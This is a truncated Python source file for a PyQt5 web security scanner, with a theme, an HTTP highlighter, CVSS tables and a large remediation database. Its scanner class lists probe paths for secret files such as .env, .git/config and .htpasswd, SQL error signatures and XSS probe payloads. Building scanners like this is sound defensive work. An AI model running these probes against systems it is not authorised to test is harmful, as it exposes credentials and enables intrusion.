#!/usr/bin/env python3
"""
WebSec Pro - Advanced Web Security Scanner
A professional-grade PyQt5 GUI application for web security testing.

Features:
  - Web crawler with HTTP traffic logging
  - Vulnerability scanner (XSS, SQLi, CSRF, Headers, etc.)
  - HTTP Traffic Inspector with request/response viewer
  - Manual testing tab with request editor
  - Exploitation tab with automated exploit runners
"""

import sys
import re
import json
import time
import random
import threading
import urllib.parse
from datetime import datetime
from collections import OrderedDict

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout,
    QHBoxLayout, QSplitter, QTreeWidget, QTreeWidgetItem, QTextEdit,
    QLineEdit, QPushButton, QLabel, QComboBox, QCheckBox, QGroupBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QProgressBar,
    QStatusBar, QMenuBar, QMenu, QAction, QFrame, QScrollArea,
    QDialog, QDialogButtonBox, QFormLayout, QSpinBox, QTextBrowser,
    QSizePolicy, QAbstractItemView, QToolBar, QDockWidget, QListWidget,
    QListWidgetItem, QMessageBox, QTabBar, QStyleFactory, QPlainTextEdit,
    QFileDialog
)
from PyQt5.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QUrl, QSize, QMimeData,
    QPropertyAnimation, QEasingCurve, QPoint, QRect, pyqtSlot
)
from PyQt5.QtGui import (
    QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QBrush,
    QPen, QLinearGradient, QTextCharFormat, QSyntaxHighlighter,
    QFontMetrics, QCursor, QTextCursor
)
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply

# ─── Try imports, gracefully degrade ─────────────────────────────────────────
try:
    import requests
    from requests.exceptions import RequestException
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# ─── DARK CYBERPUNK THEME ─────────────────────────────────────────────────────
DARK_STYLESHEET = """
QMainWindow, QDialog {
    background-color: #0a0e1a;
    color: #c8d8e8;
}
QWidget {
    background-color: #0a0e1a;
    color: #c8d8e8;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}
QTabWidget::pane {
    border: 1px solid #1e3a5f;
    background-color: #0d1220;
    border-radius: 2px;
}
QTabBar::tab {
    background-color: #0d1220;
    color: #5a7a9a;
    padding: 8px 18px;
    border: 1px solid #1e3a5f;
    border-bottom: none;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    min-width: 100px;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
}
QTabBar::tab:selected {
    background-color: #0d1220;
    color: #00d4ff;
    border-bottom: 2px solid #00d4ff;
}
QTabBar::tab:hover:!selected {
    background-color: #111827;
    color: #7ab8d4;
}
QTreeWidget, QTableWidget, QListWidget {
    background-color: #0d1220;
    border: 1px solid #1e3a5f;
    color: #c8d8e8;
    alternate-background-color: #0f1525;
    gridline-color: #1a2a3a;
    selection-background-color: #1a3a5f;
    selection-color: #00d4ff;
    outline: none;
}
QTreeWidget::item, QTableWidget::item, QListWidget::item {
    padding: 4px 6px;
    border-bottom: 1px solid #111827;
}
QTreeWidget::item:hover, QTableWidget::item:hover, QListWidget::item:hover {
    background-color: #112233;
    color: #aad4f0;
}
QTreeWidget::item:selected, QTableWidget::item:selected, QListWidget::item:selected {
    background-color: #1a3a5f;
    color: #00d4ff;
}
QHeaderView::section {
    background-color: #0a0e1a;
    color: #4a8aaa;
    padding: 6px 8px;
    border: none;
    border-right: 1px solid #1e3a5f;
    border-bottom: 2px solid #1e3a5f;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
    text-transform: uppercase;
}
QTextEdit, QPlainTextEdit, QTextBrowser {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    color: #a0c8e8;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
    selection-background-color: #1a4a7f;
    selection-color: #ffffff;
    border-radius: 2px;
    padding: 4px;
}
QLineEdit {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    border-radius: 3px;
    color: #c8d8e8;
    padding: 6px 10px;
    font-size: 12px;
    selection-background-color: #1a4a7f;
}
QLineEdit:focus {
    border: 1px solid #00d4ff;
}
QPushButton {
    background-color: #0f2040;
    border: 1px solid #1e5080;
    color: #78b8d8;
    padding: 7px 16px;
    border-radius: 3px;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
    min-width: 80px;
}
QPushButton:hover {
    background-color: #1a3a6a;
    border: 1px solid #00d4ff;
    color: #00d4ff;
}
QPushButton:pressed {
    background-color: #0a2040;
}
QPushButton:disabled {
    background-color: #080c18;
    border: 1px solid #1a2a3a;
    color: #2a4a6a;
}
QPushButton#btnDanger {
    background-color: #3a0f0f;
    border: 1px solid #7a1f1f;
    color: #ff6060;
}
QPushButton#btnDanger:hover {
    background-color: #5a1a1a;
    border: 1px solid #ff4040;
    color: #ff4040;
}
QPushButton#btnSuccess {
    background-color: #0f3a1a;
    border: 1px solid #1f7a3a;
    color: #40dd80;
}
QPushButton#btnSuccess:hover {
    background-color: #1a5a2a;
    border: 1px solid #40dd80;
    color: #40dd80;
}
QPushButton#btnWarning {
    background-color: #3a2a0f;
    border: 1px solid #7a5a1a;
    color: #ffaa30;
}
QPushButton#btnWarning:hover {
    background-color: #5a3a10;
    border: 1px solid #ffaa30;
}
QComboBox {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    border-radius: 3px;
    color: #c8d8e8;
    padding: 5px 10px;
    min-width: 100px;
}
QComboBox::drop-down {
    border: none;
    width: 20px;
}
QComboBox QAbstractItemView {
    background-color: #0d1220;
    border: 1px solid #1e3a5f;
    color: #c8d8e8;
    selection-background-color: #1a3a5f;
}
QCheckBox {
    color: #a0b8c8;
    spacing: 8px;
}
QCheckBox::indicator {
    width: 14px;
    height: 14px;
    border: 1px solid #2a5a7a;
    background-color: #080c18;
    border-radius: 2px;
}
QCheckBox::indicator:checked {
    background-color: #00aacc;
    border: 1px solid #00d4ff;
}
QGroupBox {
    border: 1px solid #1e3a5f;
    border-radius: 4px;
    margin-top: 12px;
    padding-top: 10px;
    color: #4a8aaa;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
}
QGroupBox::title {
    subcontrol-origin: margin;
    subcontrol-position: top left;
    left: 10px;
    padding: 0 6px;
    color: #3a8aaa;
}
QProgressBar {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    border-radius: 3px;
    text-align: center;
    color: #c8d8e8;
    font-size: 11px;
    height: 18px;
}
QProgressBar::chunk {
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #005580, stop:1 #00aad4);
    border-radius: 2px;
}
QStatusBar {
    background-color: #050810;
    border-top: 1px solid #1e3a5f;
    color: #4a7a9a;
    font-size: 11px;
}
QMenuBar {
    background-color: #050810;
    color: #8ab8d8;
    border-bottom: 1px solid #1e3a5f;
}
QMenuBar::item:selected {
    background-color: #1a3a5f;
    color: #00d4ff;
}
QMenu {
    background-color: #0d1220;
    border: 1px solid #1e3a5f;
    color: #c8d8e8;
}
QMenu::item:selected {
    background-color: #1a3a5f;
    color: #00d4ff;
}
QSplitter::handle {
    background-color: #1e3a5f;
    width: 2px;
    height: 2px;
}
QScrollBar:vertical {
    background-color: #080c18;
    width: 10px;
    border: none;
}
QScrollBar::handle:vertical {
    background-color: #1e3a5f;
    min-height: 20px;
    border-radius: 5px;
}
QScrollBar::handle:vertical:hover {
    background-color: #2a5a8a;
}
QScrollBar:horizontal {
    background-color: #080c18;
    height: 10px;
    border: none;
}
QScrollBar::handle:horizontal {
    background-color: #1e3a5f;
    min-width: 20px;
    border-radius: 5px;
}
QToolBar {
    background-color: #050810;
    border-bottom: 1px solid #1e3a5f;
    spacing: 4px;
    padding: 3px;
}
QLabel#titleLabel {
    color: #00d4ff;
    font-size: 16px;
    font-weight: bold;
    letter-spacing: 3px;
}
QLabel#sectionLabel {
    color: #4a8aaa;
    font-size: 10px;
    font-weight: bold;
    letter-spacing: 2px;
    text-transform: uppercase;
    padding: 4px 0;
}
"""

# ─── SEVERITY COLORS ──────────────────────────────────────────────────────────
SEVERITY = {
    "CRITICAL": "#ff2040",
    "HIGH":     "#ff6030",
    "MEDIUM":   "#ffaa20",
    "LOW":      "#30ccff",
    "INFO":     "#60cc80",
}

HTTP_METHOD_COLORS = {
    "GET":    "#30ccff",
    "POST":   "#40dd80",
    "PUT":    "#ffaa30",
    "DELETE": "#ff5050",
    "PATCH":  "#cc80ff",
    "HEAD":   "#8888ff",
    "OPTIONS":"#888888",
}

STATUS_COLORS = {
    2: "#40dd80",   # 2xx
    3: "#ffcc40",   # 3xx
    4: "#ff8040",   # 4xx
    5: "#ff3030",   # 5xx
}


# ─── SYNTAX HIGHLIGHTER ───────────────────────────────────────────────────────
class HttpHighlighter(QSyntaxHighlighter):
    def __init__(self, document):
        super().__init__(document)
        self.rules = []

        # HTTP method
        fmt = QTextCharFormat()
        fmt.setForeground(QColor("#00d4ff"))
        fmt.setFontWeight(QFont.Bold)
        self.rules.append((re.compile(r'^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|CONNECT)\b'), fmt))

        # HTTP version
        fmt2 = QTextCharFormat()
        fmt2.setForeground(QColor("#9090ff"))
        self.rules.append((re.compile(r'HTTP/\d+\.\d+'), fmt2))

        # Header names
        fmt3 = QTextCharFormat()
        fmt3.setForeground(QColor("#60aacc"))
        self.rules.append((re.compile(r'^[\w-]+(?=:)', re.MULTILINE), fmt3))

        # Header values (after colon)
        fmt4 = QTextCharFormat()
        fmt4.setForeground(QColor("#a0c880"))
        self.rules.append((re.compile(r'(?<=:)\s*.+'), fmt4))

        # JSON keys
        fmt5 = QTextCharFormat()
        fmt5.setForeground(QColor("#88ccff"))
        self.rules.append((re.compile(r'"[\w-]+"(?=\s*:)'), fmt5))

        # JSON string values
        fmt6 = QTextCharFormat()
        fmt6.setForeground(QColor("#90ee90"))
        self.rules.append((re.compile(r'(?<=:\s)"[^"]*"'), fmt6))

        # Numbers
        fmt7 = QTextCharFormat()
        fmt7.setForeground(QColor("#ffcc80"))
        self.rules.append((re.compile(r'\b\d+\b'), fmt7))

        # URLs
        fmt8 = QTextCharFormat()
        fmt8.setForeground(QColor("#80ddff"))
        fmt8.setFontUnderline(True)
        self.rules.append((re.compile(r'https?://[^\s"\'<>]+'), fmt8))

        # Injection payloads
        fmt9 = QTextCharFormat()
        fmt9.setForeground(QColor("#ff4060"))
        fmt9.setFontWeight(QFont.Bold)
        self.rules.append((re.compile(
            r"(<script[^>]*>|</script>|alert\([^)]*\)|'|\"|\bOR\b|\bAND\b|1=1|--|;DROP|UNION|SELECT)",
            re.IGNORECASE), fmt9))

    def highlightBlock(self, text):
        for pattern, fmt in self.rules:
            for m in pattern.finditer(text):
                self.setFormat(m.start(), m.end() - m.start(), fmt)


# ─── DATA MODELS ─────────────────────────────────────────────────────────────
class HttpEntry:
    _id_counter = 0

    def __init__(self, method, url, request_headers=None, request_body="",
                 status=None, response_headers=None, response_body="",
                 response_time=0):
        HttpEntry._id_counter += 1
        self.id = HttpEntry._id_counter
        self.method = method.upper()
        self.url = url
        self.parsed = urllib.parse.urlparse(url)
        self.request_headers = request_headers or {}
        self.request_body = request_body
        self.status = status
        self.response_headers = response_headers or {}
        self.response_body = response_body
        self.response_time = response_time  # ms
        self.timestamp = datetime.now()
        self.tags = []

    @property
    def path(self):
        return self.parsed.path or "/"

    @property
    def host(self):
        return self.parsed.netloc

    @property
    def content_type(self):
        return self.response_headers.get("Content-Type", "").split(";")[0]

    @property
    def content_length(self):
        body = self.response_body or ""
        return len(body.encode("utf-8", errors="replace"))

    def format_request(self):
        lines = [f"{self.method} {self.parsed.path or '/'}{('?' + self.parsed.query) if self.parsed.query else ''} HTTP/1.1"]
        lines.append(f"Host: {self.host}")
        for k, v in self.request_headers.items():
            if k.lower() != "host":
                lines.append(f"{k}: {v}")
        if self.request_body:
            lines.append("")
            lines.append(self.request_body)
        return "\n".join(lines)

    def format_response(self):
        if self.status is None:
            return "(No response)"
        lines = [f"HTTP/1.1 {self.status}"]
        for k, v in self.response_headers.items():
            lines.append(f"{k}: {v}")
        if self.response_body:
            lines.append("")
            lines.append(self.response_body[:8192])
            if len(self.response_body) > 8192:
                lines.append(f"\n... [{len(self.response_body) - 8192} more bytes] ...")
        return "\n".join(lines)


# ─── CVSS v3.1 METRICS DATABASE ───────────────────────────────────────────────
# Each entry: (AV, AC, PR, UI, S, C, I, A, score, vector)
CVSS_DATA = {
    "Reflected XSS":                    ("N","L","N","R","C","L","L","N", 6.1,  "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "Reflected XSS (Form)":             ("N","L","N","R","C","L","L","N", 6.1,  "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "Stored XSS":                       ("N","L","L","N","C","L","L","N", 7.4,  "AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N"),
    "SQL Injection (Error-Based)":      ("N","L","N","N","U","H","H","H", 9.8,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "SQL Injection (Boolean-Based)":    ("N","L","N","N","U","H","H","H", 9.8,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Server-Side Request Forgery (SSRF)":("N","L","N","N","C","H","L","N", 8.6, "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"),
    "Possible SSRF (Unconfirmed)":      ("N","L","N","N","C","L","L","N", 6.5,  "AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"),
    "Path Traversal (IDOR)":            ("N","L","N","N","U","H","N","N", 7.5,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Open Redirect":                    ("N","L","N","R","U","L","L","N", 6.1,  "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"),
    "CSRF Token Missing":               ("N","L","N","R","U","N","L","N", 4.3,  "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"),
    "Exposed .git Repository":          ("N","L","N","N","U","H","N","N", 7.5,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Exposed .env File":                ("N","L","N","N","U","H","H","N", 9.1,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    "PHP Info Page Exposed":            ("N","L","N","N","U","L","N","N", 5.3,  "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Directory Listing Enabled":        ("N","L","N","N","U","L","N","N", 5.3,  "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Admin Panel Accessible":           ("N","L","N","N","U","H","H","H", 9.8,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "API Documentation Exposed":        ("N","L","N","N","U","L","N","N", 5.3,  "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Server Version Disclosure":        ("N","L","N","N","U","L","N","N", 5.3,  "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Technology Disclosure (X-Powered-By)":("N","L","N","N","U","L","N","N", 5.3,"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    "Sensitive Data in API Response":   ("N","L","N","N","U","H","N","N", 7.5,  "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
}
# Default for unknown types
CVSS_DEFAULT = ("N","L","N","N","U","L","N","N", 5.0, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N")
CVSS_LABELS = {
    "AV": {"N":"Network","A":"Adjacent","L":"Local","P":"Physical"},
    "AC": {"L":"Low","H":"High"},
    "PR": {"N":"None","L":"Low","H":"High"},
    "UI": {"N":"None","R":"Required"},
    "S":  {"U":"Unchanged","C":"Changed"},
    "C":  {"N":"None","L":"Low","H":"High"},
    "I":  {"N":"None","L":"Low","H":"High"},
    "A":  {"N":"None","L":"Low","H":"High"},
}

# ─── REMEDIATION DATABASE ──────────────────────────────────────────────────────
REMEDIATION_DB = {
    "Reflected XSS": {
        "summary": "Encode all user-supplied data before rendering it in HTML.",
        "steps": [
            "Apply context-sensitive output encoding (HTML-encode for HTML context, JS-encode for script context).",
            "Implement a strict Content-Security-Policy (CSP) header: `Content-Security-Policy: default-src 'self'`.",
            "Use a templating engine that auto-escapes by default (Jinja2, Django templates, React JSX).",
            "Set the `HttpOnly` and `Secure` flags on session cookies to limit exfiltration impact.",
            "Validate and allowlist acceptable input on the server side; never rely solely on client-side validation.",
        ],
        "references": ["CWE-79", "OWASP Top 10 A03:2021", "https://owasp.org/www-community/attacks/xss/"],
    },
    "Reflected XSS (Form)": {
        "summary": "Encode all user-supplied form data before reflecting it in HTML responses.",
        "steps": [
            "Apply HTML output encoding to all form field values included in server responses.",
            "Deploy a Content-Security-Policy header to block inline script execution.",
            "Use framework-level auto-escaping rather than manual string concatenation into HTML.",
            "Add a CSRF token to forms to prevent cross-origin form submission.",
        ],
        "references": ["CWE-79", "OWASP Top 10 A03:2021"],
    },
    "SQL Injection (Error-Based)": {
        "summary": "Never concatenate user input into SQL queries; use parameterised statements.",
        "steps": [
            "Use prepared statements / parameterised queries in all database interactions.",
            "Apply an ORM (SQLAlchemy, Hibernate, ActiveRecord) that handles parameterisation automatically.",
            "Disable verbose database error messages in production — log them server-side only.",
            "Apply the principle of least privilege: the database account used by the app should not have DROP, ALTER, or GRANT permissions.",
            "Consider a Web Application Firewall (WAF) as a secondary defence layer, not a primary fix.",
        ],
        "references": ["CWE-89", "OWASP Top 10 A03:2021", "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"],
    },
    "SQL Injection (Boolean-Based)": {
        "summary": "Replace dynamic SQL construction with parameterised queries or stored procedures.",
        "steps": [
            "Use parameterised queries or stored procedures exclusively — never build SQL strings from user input.",
            "Implement input validation and type-checking (e.g., assert numeric IDs are integers before use).",
            "Suppress all database error details from responses; use generic error pages.",
            "Enforce least-privilege database accounts.",
            "Enable query logging and monitor for anomalous patterns (unusually long queries, many UNION keywords).",
        ],
        "references": ["CWE-89", "OWASP Top 10 A03:2021"],
    },
    "Server-Side Request Forgery (SSRF)": {
        "summary": "Validate and restrict outbound HTTP requests made by the server.",
        "steps": [
            "Implement an allowlist of permitted outbound domains/IPs; reject all others.",
            "Block requests to RFC 1918 private ranges (10.x, 172.16–31.x, 192.168.x), loopback (127.x), and link-local (169.254.x).",
            "Disable unnecessary URL-fetching features; if needed, use a separate sandboxed micro-service.",
            "On cloud deployments, restrict access to the instance metadata endpoint via IAM policies or firewall rules.",
            "Never return raw server-to-server responses to the client.",
        ],
        "references": ["CWE-918", "OWASP Top 10 A10:2021"],
    },
    "Path Traversal (IDOR)": {
        "summary": "Never use user-supplied input to construct file system paths.",
        "steps": [
            "Use an allowlist of permitted filenames or map user input to an internal ID rather than a path.",
            "Canonicalise paths with `os.path.realpath()` / `Path.resolve()` and verify they sit within the intended root directory.",
            "Run the web server process under a dedicated low-privilege user with no access outside the web root.",
            "Disable directory listing on the web server (Apache: `Options -Indexes`; Nginx: `autoindex off`).",
        ],
        "references": ["CWE-22", "OWASP Top 10 A01:2021"],
    },
    "Open Redirect": {
        "summary": "Validate redirect destinations against an allowlist of trusted URLs.",
        "steps": [
            "Maintain an allowlist of permitted redirect targets; reject everything else.",
            "Avoid using user-controlled data for redirect destinations entirely; prefer internal route identifiers.",
            "If external redirects are required, display an interstitial warning page before redirecting.",
            "Validate that the final URL's host matches the application's own host.",
        ],
        "references": ["CWE-601", "OWASP Top 10 A01:2021"],
    },
    "CSRF Token Missing": {
        "summary": "Protect state-changing endpoints with CSRF tokens or Same-Site cookie attributes.",
        "steps": [
            "Generate a cryptographically random CSRF token per session and include it as a hidden field in every form.",
            "Validate the token server-side on all state-changing requests (POST, PUT, DELETE, PATCH).",
            "Set `SameSite=Strict` or `SameSite=Lax` on session cookies to block cross-site request forgery by default.",
            "Verify the `Origin` and `Referer` headers as an additional defence layer.",
            "Use the Synchronizer Token Pattern or Double Submit Cookie pattern.",
        ],
        "references": ["CWE-352", "OWASP Top 10 A01:2021", "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"],
    },
    "Exposed .git Repository": {
        "summary": "Block public access to version control metadata directories.",
        "steps": [
            "Add a server rule to deny access to `/.git/` (Apache: `<Directory .git> Deny from all </Directory>`; Nginx: `location ~ /\\.git { deny all; }`).",
            "Rotate all secrets, API keys, and credentials that may have been stored in the repository history.",
            "Audit `git log` and `git reflog` for any committed secrets and remove them using `git filter-repo`.",
            "Add `.env`, `*.key`, `*.pem`, and secret files to `.gitignore`.",
        ],
        "references": ["CWE-538", "OWASP Top 10 A05:2021"],
    },
    "Exposed .env File": {
        "summary": "Immediately rotate all credentials in the exposed file; block web access to environment files.",
        "steps": [
            "IMMEDIATE: Rotate all API keys, database passwords, and secrets present in the file.",
            "Block web server access to all dotfiles (`.env`, `.htpasswd`, etc.).",
            "Store secrets in environment variables injected at runtime, or use a secrets manager (AWS Secrets Manager, HashiCorp Vault).",
            "Add `.env*` to `.gitignore` to prevent future commits.",
            "Audit access logs for prior reads of this file.",
        ],
        "references": ["CWE-312", "OWASP Top 10 A02:2021"],
    },
    "Admin Panel Accessible": {
        "summary": "Restrict administrative interfaces to authorised networks and users.",
        "steps": [
            "Move the admin interface to a non-standard path and restrict access by IP allowlist.",
            "Enforce multi-factor authentication (MFA) for all admin accounts.",
            "Implement account lockout after a small number of failed login attempts.",
            "Consider separating the admin interface onto an internal-only network or VPN.",
            "Add rate limiting and CAPTCHA to the login endpoint.",
        ],
        "references": ["CWE-284", "OWASP Top 10 A01:2021"],
    },
    "Directory Listing Enabled": {
        "summary": "Disable automatic directory index pages on the web server.",
        "steps": [
            "Apache: Add `Options -Indexes` to the relevant `<Directory>` block or `.htaccess`.",
            "Nginx: Set `autoindex off;` in the location block.",
            "IIS: Disable Directory Browsing in the site's Features view.",
            "Ensure every directory that must be web-accessible contains an `index.html` or equivalent.",
        ],
        "references": ["CWE-548", "OWASP Top 10 A05:2021"],
    },
    "PHP Info Page Exposed": {
        "summary": "Remove or restrict access to phpinfo() pages in production.",
        "steps": [
            "Delete `phpinfo.php`, `info.php`, `test.php`, and similar diagnostic files from production servers.",
            "Restrict access to any diagnostic pages to localhost or a management network via web server configuration.",
            "Implement a deployment checklist that checks for debug/info pages before going live.",
        ],
        "references": ["CWE-200", "OWASP Top 10 A05:2021"],
    },
    "API Documentation Exposed": {
        "summary": "Restrict API documentation to authenticated users or internal networks.",
        "steps": [
            "Move Swagger/OpenAPI docs behind authentication.",
            "If the API is public, ensure the docs don't expose internal endpoints, admin routes, or sensitive parameters.",
            "Consider generating a sanitised public version of the spec that omits internal/admin paths.",
        ],
        "references": ["CWE-200", "OWASP Top 10 A05:2021"],
    },
    "Server Version Disclosure": {
        "summary": "Remove or suppress version information from server response headers.",
        "steps": [
            "Apache: Set `ServerTokens Prod` and `ServerSignature Off` in `httpd.conf`.",
            "Nginx: Set `server_tokens off;` in `nginx.conf`.",
            "IIS: Use URLScan or web.config `<httpRuntime enableVersionHeader='false'/>`.",
            "Remove or customise the `Server` header using middleware (e.g., helmet.js in Node.js).",
        ],
        "references": ["CWE-200", "OWASP Top 10 A05:2021"],
    },
    "Technology Disclosure (X-Powered-By)": {
        "summary": "Remove the X-Powered-By header to prevent technology stack disclosure.",
        "steps": [
            "PHP: Set `expose_php = Off` in `php.ini`.",
            "Express/Node.js: Call `app.disable('x-powered-by')` or use the `helmet` middleware.",
            "ASP.NET: Remove `X-Powered-By` via IIS response headers configuration or web.config.",
            "Apache: Use `mod_headers` with `Header unset X-Powered-By`.",
        ],
        "references": ["CWE-200", "OWASP Top 10 A05:2021"],
    },
    "Missing Security Header: Content-Security-Policy": {
        "summary": "Implement a Content-Security-Policy header to restrict resource loading.",
        "steps": [
            "Start with a report-only policy: `Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report`.",
            "Tighten the policy iteratively: restrict `script-src`, `style-src`, `img-src`, `connect-src`.",
            "Eliminate inline scripts and styles — move to external files referenced by the CSP allowlist.",
            "Use `nonce-` or `hash-` based allowlisting if inline scripts are unavoidable.",
            "Deploy the enforcement header once the policy is stable: `Content-Security-Policy: ...`.",
        ],
        "references": ["OWASP Top 10 A05:2021", "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"],
    },
    "Missing Security Header: X-Frame-Options": {
        "summary": "Add X-Frame-Options or CSP frame-ancestors to prevent clickjacking.",
        "steps": [
            "Add `X-Frame-Options: DENY` (or `SAMEORIGIN` if framing by the same origin is needed).",
            "Prefer CSP `frame-ancestors 'none'` which supersedes X-Frame-Options in modern browsers.",
            "Verify the header is present on all pages, not just the homepage.",
        ],
        "references": ["CWE-1021", "OWASP Top 10 A05:2021"],
    },
    "Missing Security Header: Strict-Transport-Security": {
        "summary": "Enable HSTS to enforce HTTPS connections.",
        "steps": [
            "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains` once HTTPS is fully deployed.",
            "Start with a short `max-age` (e.g., 300 seconds) and increase after verifying no breakage.",
            "Consider adding `preload` and submitting the domain to the HSTS preload list.",
            "Ensure the HSTS header is only served over HTTPS — never over HTTP.",
        ],
        "references": ["OWASP Top 10 A05:2021", "https://hstspreload.org"],
    },
    "Sensitive Data in API Response": {
        "summary": "Never return sensitive fields (passwords, secrets, PII) in API responses.",
        "steps": [
            "Audit all API response serialisers to ensure sensitive fields are explicitly excluded.",
            "Use dedicated response DTOs/view models rather than directly serialising database models.",
            "Apply field-level access control — return only what the requesting user is authorised to see.",
            "Hash passwords at rest and never include them in any response, even for admins.",
            "Classify data by sensitivity and apply data masking for medium-sensitivity fields (e.g., show only last 4 digits of card numbers).",
        ],
        "references": ["CWE-312", "CWE-359", "OWASP Top 10 A02:2021"],
    },
}
# Generic fallback remediation
REMEDIATION_GENERIC = {
    "summary": "Apply the principle of least privilege, validate all inputs, and encode all outputs.",
    "steps": [
        "Validate all user-supplied input on the server side (type, length, format, range).",
        "Encode all output appropriate to the context (HTML, JS, URL, SQL).",
        "Apply the principle of least privilege throughout the application stack.",
        "Keep all frameworks, libraries, and server software up to date.",
        "Implement logging and monitoring to detect exploitation attempts.",
    ],
    "references": ["OWASP Top 10", "https://owasp.org"],
}


class VulnEntry:
    def __init__(self, vuln_type, severity, url, parameter, description,
                 payload="", evidence="", http_entry=None):
        self.vuln_type   = vuln_type
        self.severity    = severity
        self.url         = url
        self.parameter   = parameter
        self.description = description
        self.payload     = payload
        self.evidence    = evidence
        self.http_entry  = http_entry
        self.timestamp   = datetime.now()
        self.confirmed   = False

        # CVSS v3.1
        cvss = CVSS_DATA.get(vuln_type) or CVSS_DATA.get(
            next((k for k in CVSS_DATA if vuln_type.startswith(k[:20])), None),
            None
        ) or CVSS_DEFAULT
        self.cvss_av, self.cvss_ac, self.cvss_pr, self.cvss_ui, \
            self.cvss_s, self.cvss_c, self.cvss_i, self.cvss_a, \
            self.cvss_score, self.cvss_vector = cvss

        # Remediation
        self.remediation = (
            REMEDIATION_DB.get(vuln_type) or
            REMEDIATION_DB.get(next((k for k in REMEDIATION_DB if vuln_type.startswith(k[:20])), None)) or
            REMEDIATION_GENERIC
        )


# ─── REAL SCANNER WORKER ──────────────────────────────────────────────────────
class ScanWorker(QThread):
    """
    Real web security scanner:
      Phase 1 – BFS crawler: follows links within the target domain, discovers
                endpoints, collects URL parameters and forms.
      Phase 2 – Sensitive path probe: checks common misconfigurations.
      Phase 3 – Vulnerability modules: XSS, SQLi, open redirect, security
                headers, CSRF, directory listing, sensitive data exposure.
    All HTTP requests are live; nothing is simulated.
    """
    sig_progress   = pyqtSignal(int, str)
    sig_http_entry = pyqtSignal(object)
    sig_vuln       = pyqtSignal(object)
    sig_log        = pyqtSignal(str, str)
    sig_done       = pyqtSignal(str)

    # Paths probed for misconfigurations / sensitive files
    PROBE_PATHS = [
        "/.git/config", "/.git/HEAD", "/.env", "/.env.backup",
        "/config.php", "/config.php.bak", "/wp-config.php",
        "/backup.zip", "/backup.tar.gz", "/db.sql",
        "/admin", "/admin/", "/admin/login", "/phpmyadmin",
        "/wp-admin", "/wp-admin/", "/manager/html",
        "/api/v1/users", "/api/v2/users", "/api/users",
        "/swagger.json", "/openapi.json", "/api-docs",
        "/graphql", "/graphiql",
        "/server-status", "/server-info",
        "/.htpasswd", "/.DS_Store",
        "/robots.txt", "/sitemap.xml",
        "/phpinfo.php", "/info.php", "/test.php",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
    ]

    # SQLi error signatures (databases leak messages on bad syntax)
    SQLI_ERRORS = [
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"pg_query\(\).*failed",
        r"supplied argument is not a valid postgresql",
        r"ora-\d{5}",
        r"microsoft ole db provider for sql server",
        r"odbc sql server driver",
        r"sqlite_error",
        r"sqlite3.*operationalerror",
        r"syntax error.*near",
    ]

    # XSS probe tokens — context-aware payloads covering HTML body, attribute, JS contexts
    XSS_PROBES = [
        # HTML body context
        ('<script>alert(1)</script>',       r'<script>alert\(1\)</script>'),
        ('<img src=x onerror=alert(1)>',    r'onerror=alert\(1\)'),
        ('"><svg/onload=alert(1)>',         r'onload=alert\(1\)'),
        # Attribute breakout
        ("'><script>alert(1)</script>",     r'<script>alert\(1\)</script>'),
        # Tag attribute injection
        ('<details open ontoggle=alert(1)>', r'ontoggle=alert\(1\)'),
